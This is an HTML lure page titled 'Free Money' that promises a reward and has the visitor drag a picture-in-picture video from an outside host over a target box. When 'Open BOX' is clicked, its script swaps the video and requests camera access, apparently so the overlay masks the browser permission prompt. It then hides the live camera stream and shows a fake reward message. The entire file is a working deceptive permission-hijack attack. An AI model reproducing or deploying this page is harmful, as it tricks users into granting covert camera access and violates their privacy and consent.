<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Money</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        #pipTarget {
            width: 700px;
            height: 400px;
            border: 2px dashed #333;
            position: absolute;
            top: 1px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            color: #333;
            background-color: rgba(255, 0, 0, 0.2);
            transition: background-color 0.3s;
        }

        #rewardText {
            display: none;
            font-size: 24px;
            font-weight: bold;
            color: green;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div id="pipTarget">Place BOX Here To Get Reward</div>
<button id="pipButton">Click this to claim your reward.</button>
<button id="actionButton" style="display: none;">Open BOX</button>
<p id="rewardText">YES! YOU GOT A REWARD</p>

<video id="externalVideo" src="https://selebewsss.github.io/spofcenah2/0316(1).mp4" autoplay style="display: none;"></video>

<script>
    const externalVideo = document.getElementById('externalVideo');
    const actionButton = document.getElementById('actionButton');
    const pipButton = document.getElementById('pipButton');
    const pipTarget = document.getElementById('pipTarget');
    const rewardText = document.getElementById('rewardText');

    let isPiPActive = false;

    pipButton.addEventListener('click', async () => {
        try {
            externalVideo.src = "https://selebewsss.github.io/spofcenah2/0316(1).mp4";
            await externalVideo.play();
            await externalVideo.requestPictureInPicture();
            isPiPActive = true;
            monitorPiP();
        } catch (error) {
            console.error('Error:', error);
        }
    });

    function monitorPiP() {
        if (!isPiPActive) return;

        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting && isPiPActive) {
                    actionButton.style.display = 'block';
                    pipButton.style.display = 'none';
                    pipTarget.style.backgroundColor = 'rgba(0, 255, 0, 0.2)';
                } else {
                    actionButton.style.display = 'none';
                    pipTarget.style.backgroundColor = 'rgba(255, 0, 0, 0.2)';
                }
            });
        }, { threshold: 1.0 });

        observer.observe(pipTarget);
    }

    document.addEventListener('leavepictureinpicture', () => {
        isPiPActive = false;
        actionButton.style.display = 'none';
        pipButton.style.display = 'block';
        pipTarget.style.backgroundColor = 'rgba(255, 0, 0, 0.2)';
    });

    actionButton.addEventListener('click', async () => {
        try {
            externalVideo.src = "https://selebewsss.github.io/spofcenah2/0316.mp4";
            await externalVideo.play();
            await externalVideo.requestPictureInPicture();
            
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.autoplay = true;
            videoElement.style.display = "none";
            document.body.appendChild(videoElement);
            
            if (document.pictureInPictureElement) {
                await document.exitPictureInPicture();
            }
            
            // Sembunyikan semua elemen kecuali rewardText
            pipButton.style.display = 'none';
            pipTarget.style.display = 'none';
            actionButton.style.display = 'none';
            externalVideo.style.display = 'none';
            
            rewardText.style.display = 'block';
        } catch (error) {
            console.error('Error:', error);
        }
    });
</script>

</body>
</html>
